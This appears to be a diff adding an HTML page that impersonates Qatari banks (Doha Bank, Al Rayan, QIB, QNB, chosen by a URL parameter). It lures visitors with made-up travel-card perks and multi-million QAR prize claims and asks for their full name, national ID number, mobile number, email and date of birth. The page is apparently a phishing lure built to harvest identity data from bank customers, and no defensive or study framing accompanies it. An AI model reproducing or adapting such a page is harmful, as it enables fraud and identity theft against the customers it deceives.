@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Customer Personal Data</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; padding-top: 70px; padding-bottom: 20px; }
+        
+        .header { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
+        .logo { height: 40px; }
+        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
+        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
+
+        .bank-box { width: 100%; background: #fff; border-bottom: 1px solid #ddd; padding: 10px 0; }
+        .bank-logo { width: 90%; max-width: 400px; display: block; margin: 0 auto; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+
+        .info-box { background: white; margin: 15px; padding: 15px; border-radius: 10px; border-left: 5px solid #8C0032; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .line { border-bottom: 1px solid #eee; padding: 8px 0; font-size: 14px; color: #333; }
+        .rewards-line { padding: 8px 0; color: #8C0032; font-weight: bold; font-size: 14px; border-bottom: 1px solid #eee; }
+
+        .form-container { padding: 20px; background: white; margin: 15px; border-radius: 10px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-weight: bold; margin-bottom: 5px; color: #555; }
+        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
+        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        
+        .footer-image { width: 100%; display: block; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <div style="display:flex; align-items:center; gap:15px;">
+            <div class="menu-icon">&#9776;</div>
+            <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" class="logo">
+        </div>
+        <a href="personal_data.html" class="lang-btn" style="text-decoration: none;">عربي</a>
+    </header>
+
+    <div class="bank-box">
+        <img id="dynamicBankLogo" src="" class="bank-logo" alt="Bank Logo">
+    </div>
+
+    <div class="info-box">
+        <div class="line">✔ Card Benefits: Priority processing, Double Avios points, Lounge access</div>
+        <div class="line">✔ Best Airlines: Qatar Airways, Singapore Airlines, Emirates</div>
+        <div class="line">✔ Best Business Class: Qatar Qsuite, Singapore Business Class</div>
+        <div class="line">✔ Best Lounges: Al Mourjan Lounge, SilverKris Lounges</div>
+        <div class="line">✔ Best Airline in the Middle East: Qatar Airways, Emirates, Etihad</div>
+        <div class="rewards-line">● Monthly rewards up to 5,000 QAR</div>
+        <div class="rewards-line">● Annual prizes up to 3,000,000 QAR</div>
+        <div class="rewards-line">● Global discounts up to 70%</div>
+    </div>
+
+    <div class="form-container">
+        <div class="form-group"><label>Full Name (as per ID)</label><input type="text" placeholder="Full Name"></div>
+        <div class="form-group"><label>Name (Arabic)</label><input type="text" placeholder="الاسم الكامل"></div>
+        <div class="form-group"><label>ID Number</label><input type="number" placeholder="ID Number"></div>
+        <div class="form-group"><label>Mobile Number</label><input type="number" placeholder="00974XXXXXXXX"></div>
+        <div class="form-group"><label>Email (Gmail)</label><input type="email" placeholder="example@gmail.com"></div>
+        <div class="form-group"><label>Date of Birth</label><input type="date"></div>
+        <div class="form-group"><label>Gender</label><select><option>Male</option><option>Female</option></select></div>
+        <div class="form-group"><label>Customer Status</label><select><option>Existing Customer</option><option>New Customer</option></select></div>
+        <button class="submit-btn">Continue</button>
+    </div>
+
+    <img src="https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg" class="footer-image" alt="Footer">
+
+    <script>
+        const logos = {
+            'doha': 'https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg',
+            'rayan': 'https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg',
+            'qib': 'https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg',
+            'qnb': 'https://i.ibb.co/Pz47HdB3/169282.jpg'
+        };
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const bank = urlParams.get('bank') || 'doha';
+
+        document.getElementById('dynamicBankLogo').src = logos[bank] || logos['doha'];
+    </script>
+</body>
+</html>
